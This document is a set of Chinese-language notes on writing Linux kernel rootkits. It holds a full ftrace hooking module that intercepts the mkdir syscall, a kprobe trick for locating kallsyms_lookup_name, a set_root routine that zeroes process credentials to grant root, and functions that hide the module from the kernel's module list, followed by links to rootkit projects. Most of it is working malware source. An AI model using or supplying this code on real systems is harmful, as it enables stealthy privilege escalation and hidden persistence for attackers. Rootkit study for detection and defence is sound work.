# 内核版本判断

```c
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,36)
static long minor_ioctl(struct file *filp,unsigned int cmd,unsigned long arg)
#else
static int minor_ioctl(struct inode *inode,struct file *filp,unsigned long arg)
#endif
```

# 系统调用参数

在4.17.0内核版本之前，系统调用的hook为：

```c
asmlinkage long my_sys_read(unsigned int fd, char __user *buf, size_t count);
```

之后为：

```c
asmlinkage long my_sys_read(const struct pt_regs *regs)
{
    int fd = regs->di;
    char __user *buf = regs->si;
    size_t count = regs->d;
    /* rest of function */
}
```

eg:

```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/syscalls.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long(*orig_mkdir)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
	char __user *pathname = (char *)regs->di;
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(regs);
	return 0;
}
#else

static asmlinkage long(*orig_mkdir)(const char __user *pathname,umode_t mode);
asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
{
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(pathname,mode);
	return 0;
}

#endif
```

# kallsyms_lookup_name地址获取

通过kprobe获取kallsyms_lookup_name函数地址

```c
/// kallsyms_lookup_name
#include <linux/kprobes.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void){
    
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
}
```

# hook

### ftrace

eg: hook mkdir

```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>

#include "ftrace_helper.h"

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long(*orig_mkdir)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
	char __user *pathname = (char *)regs->di;
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(regs);
	return 0;
}
#else

static asmlinkage long(*orig_mkdir)(const char __user *pathname,umode_t mode);
asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
{
	char dir_name[NAME_MAX] = {0};

	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);

	if(error>0){
		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
	}

	orig_mkdir(pathname,mode);
	return 0;
}

#endif

/// kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
static void* init_ksymbol(void)
{

    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

	return my_kallsyms_lookup_name;
}


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* x64 has to be special and require a different naming convention */
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Oridinarily ftrace provides it's own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 1
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes is easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = my_kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);
#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;
    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

static struct ftrace_hook hooks[] = {
	HOOK(SYSCALL_NAME("sys_mkdir"),hook_mkdir,&orig_mkdir),
};

static int __init example_init(void)
{
	int err;
	if(init_ksymbol() == NULL){
		printk("get kallsyms_lookup_name error\n");
		return -1;
	}
	
	err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if(err)
		return err;
	
	printk(KERN_INFO"rootkit:loaded\n");
	return 0;
}

static void __exit example_exit(void)
{
	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));
	printk("example_exit\n");
}

module_init(example_init);
module_exit(example_exit);
MODULE_LICENSE("GPL");

```

# root权限提升

```c
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if(root == NULL)
        return ;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    
    commit_creds(root);
}
```

# 模块隐藏

```c
void hideme(void)
{
    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
    if(module_mutex == NULL){
        printk("rootkit:get module_mutex addr error\n");
        return;
    }

    mutex_lock(module_mutex);

    list_del(&THIS_MODULE->list);

    mutex_unlock(module_mutex);

}

void showme(void)
{
    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
    struct list_head *modules = (struct list_head*)my_kallsyms_lookup_name("modules");

    if(module_mutex == NULL){
        printk("rootkit:get module_mutex addr error\n");
        return;
    }
    if(modules == NULL){
        printk("rootkit:get modules addr error\n");
        return;
    }

    mutex_lock(module_mutex);

    list_add(&THIS_MODULE->list,modules);

    mutex_unlock(module_mutex);
}
```



# 参考资料

awesome-linux-rootkits

https://github.com/milabs/awesome-linux-rootkits

kunkillable (kunkillable is an LKM (loadable kernel module) that makes userland processes unkillable.)

https://github.com/spiderpig1297/kunkillable

kprochide (kprochide is an LKM for hiding processes from the userland. The module is able to hide multiple processes and is able to dynamically receive new processes to hide.)

https://github.com/spiderpig1297/kprochide

Diamorphine

https://github.com/m0nad/Diamorphine

Linux Rootkits Part 1: Introduction and Workflow

https://xcellerator.github.io/posts/linux_rootkits_01/

https://xcellerator.github.io/tags/rootkit/